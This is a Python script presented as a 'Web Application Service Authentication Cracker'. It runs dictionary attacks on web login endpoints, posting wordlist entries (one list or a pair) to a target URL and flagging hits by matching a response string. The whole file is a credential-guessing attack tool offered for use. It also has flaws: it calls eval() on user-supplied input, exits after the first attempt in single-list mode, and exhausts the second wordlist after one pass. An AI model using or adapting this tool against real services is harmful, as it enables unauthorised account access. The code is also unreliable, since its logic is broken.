import argparse,requests,sys
payload1='nothing'
payload2='nothing'
print(' __      __                               ')
print('/  \\    /  \\_____    ___________    ____  ')
print('\\   \\/\\/   /\\__  \\  /  ___/\\__  \\ _/ ___\\ ')
print(' \\        /  / __ \\_\\___ \\  / __ \\\\  \\___ ')
print('  \\__/\\  /  (____  /____  >(____  /\\___  >')
print('       \\/        \\/     \\/      \\/     \\/ ')
print('Web Application Service Authentication Cracker v0.1.0')
print('Copyright (c) Gr3yPh 2024')
parser = argparse.ArgumentParser(description='A tool which is able to crack web applications\' service authentication')
parser.add_argument('-t','--target',type=str,help='Target URL')
parser.add_argument('--payload-count',type=int,help='Payload count (1 or 2)',default=1)
parser.add_argument('-p1','--payload1',type=str,help='The path of the first payload\'s dictionary')
parser.add_argument('-p2','--payload2',type=str,help='The path of the second payload\'s dictionary')
parser.add_argument('-f','--format',type=str,help='POST Format (use dict() to set)')
parser.add_argument('--grep-match',type=str,help='Flag items which contains grep-match value',default='failed')
args=parser.parse_args()

if args.target and args.payload_count:
    if args.payload_count == 1:
        if args.payload1:
            if args.format and '{' in args.format:
                print('[*]Starting attack...')
                try:
                    f=open(args.payload1,'r')
                except:
                    print('[-]Have trouble opening dictionary file, Please check if the file is valid.')
                    sys.exit(1)
                for payload1 in f:
                    payload1=payload1.replace('\n', '').replace('\r', '')
                    data = eval(args.format)
                    try:
                        response=requests.post(args.target,headers={'content-type':'application/json','user-agent':'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362'},json=data,timeout=10)
                    except:
                        print('[-]Have trouble connecting to the target. Check the Internet connections and try again.')
                        sys.exit(1)
                    if args.grep_match.encode() in response.content:
                        print('[+]Gotcha! Printing the right payload: ',payload1,' Response length:',len(response.text))
                        sys.exit(1)
                    else:
                        print('[-]Result doesn\'t contain \'',args.grep_match,'\'.. Response length:',len(response.text))
                        sys.exit(1)
            else:
                print('[-]Missing POST format or format is invalid. QUIT!')
                sys.exit(1)
        else:
            print('[-]Missing payload. QUIT!')
            sys.exit(1)
    elif args.payload_count == 2:
        if args.payload1 and args.payload2:
            if args.format:
                print('[*]Starting attack...')
                f1=open(args.payload1,'r')
                f2=open(args.payload2,'r')
                for payload1 in f1:
                    for payload2 in f2:
                        payload1=payload1.replace('\n', '').replace('\r', '')
                        payload2=payload2.replace('\n', '').replace('\r', '')
                        data=eval(args.format)
                        try:
                            response=requests.post(args.target,headers={'content-type':'application/json','user-agent':'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362'},data=data)
                        except:
                            print('[-]Have trouble connecting to the target. Check the Internet connections and try again.')
                            
                            sys.exit(1)
                        if args.grep_match.encode() in response.content:
                            print('[+]Gotcha! Printing the right payload: ',payload1,' and ',payload2,' Response length:',len(response.text))
                            
                        else:
                            print('[-]Result doesn\'t contain \'',args.grep_match,'\'.. Response length:',len(response.text))
            else:
                print('[-]Missing POST format. QUIT!')
                sys.exit(1)
        else:
            print('[-]Missing payload1 or payload2. QUIT!')
            sys.exit(1)
    else:
        print('[-]Payload count must be 1 or 2. QUIT!')
        sys.exit(1)
else:
    print('[-]Missing target URL or payload count. QUIT!')
    sys.exit(1)
